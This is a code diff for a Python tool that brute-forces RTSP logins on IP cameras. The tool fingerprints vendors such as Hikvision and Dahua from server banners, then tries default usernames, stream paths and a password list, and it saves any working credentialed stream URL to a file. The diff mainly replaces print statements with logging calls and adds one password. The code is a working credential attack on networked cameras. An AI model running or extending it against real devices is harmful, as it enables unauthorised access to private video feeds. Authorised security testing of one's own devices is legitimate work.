@@ -11,9 +11,10 @@ import socket
 import re
 import base64
 import os
+from lib.log_cat import LogCat
+log = LogCat()
 
 class CamLib():
-
     def Hikvision(self):
         paths = [
             'Streaming/Channels/101', 
@@ -129,6 +130,7 @@ class Execute_Cam(CamLib):
     def __init__(self):
         self.__PASSWORD = [
         '123456',
+        'fang12345',
         'admin',
         'password',
         '12345',
@@ -164,10 +166,10 @@ class Execute_Cam(CamLib):
     ]
 
     def run(self, ip: str, port=554):
-        print(f"[+] Testing target: {ip}:{port}")
+        log.info(f"Current Detection [{ip}:{port}]")
         _, banner = self.__get_rtsp_banner(ip, port)
         if banner is None:
-            print("[...] Skip")
+            log.warning("Skip...")
             return
         else:
             default_paths = [
@@ -194,34 +196,34 @@ class Execute_Cam(CamLib):
             users = ['admin']
             banner_lower = banner.lower()
             if 'hikvision' in banner_lower:
-                print("[+] Hikvision detected")
+                log.info("Hikvision detected...")
                 users, default_paths = self.Hikvision()
             elif 'dahua' in banner_lower:
-                print("[+] Dahua detected")
+                log.info("Dahua detected...")
                 users, default_paths = self.Dahua()
             elif 'uniview' in banner_lower:
-                print("[+] Uniview detected")
+                log.info("Uniview detected...")
                 users, default_paths = self.Uniview()
             elif 'axis' in banner_lower:
-                print("[+] Axis detected")
+                log.info("Axis detected...")
                 users, default_paths = self.Axis()
             elif 'sony' in banner_lower:
-                print("[+] Sony detected")
+                log.info("Sony detected...")
                 users, default_paths = self.Sony()
             elif 'vivotek' in banner_lower:
-                print("[+] Vivotek detected")
+                log.info("Vivotek detected...")
                 users, default_paths = self.Vivotek()
             elif 'reolink' in banner_lower:
-                print("[+] Reolink detected")
+                log.info("Reolink detected...")
                 users, default_paths = self.Reolink()
             elif 'tvt' in banner_lower:
-                print("[+] TVT detected")
+                log.info("TVT detected...")
                 users, default_paths = self.TVT()
             elif 'milesight' in banner_lower:
-                print("[+] Milesight detected")
+                log.info("Milesight detected...")
                 users, default_paths = self.Milesight()
             else:
-                print("[+] Unknown or clone device detected")
+                log.info("The server-side has hidden the banner and is using default options...")
             self.__rtsp_path_bruteforce(ip, port, default_paths, users)
 
 
@@ -238,14 +240,12 @@ class Execute_Cam(CamLib):
             sock.send(request.encode())
             response = sock.recv(4096).decode(errors='ignore')
             sock.close()
-            print("[*] Authentication required detected, preparing to brute-force.")
             match = re.search(r"Server:\s*(.+)", response)
             if match:
                 server = match.group(1).strip()
             else:
                 server = 'N/A'
             return (ip, server)
-        
         except Exception as e:
             return (None, None)
 
@@ -277,8 +277,7 @@ class Execute_Cam(CamLib):
                 sock.close()
                 if "200 OK" in response:
                     rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/{path}"
-                    print("[+] Successfully obtained RTSP URL")
-                    print(f"[!] RTSP URL: {rtsp_url}")
+                    log.success(f"{rtsp_url}")
                     os.makedirs('./data', exist_ok=True)
                     with open('./data/ipcam.info', 'a', encoding='utf-8') as f:
                         f.write(rtsp_url + '\n')
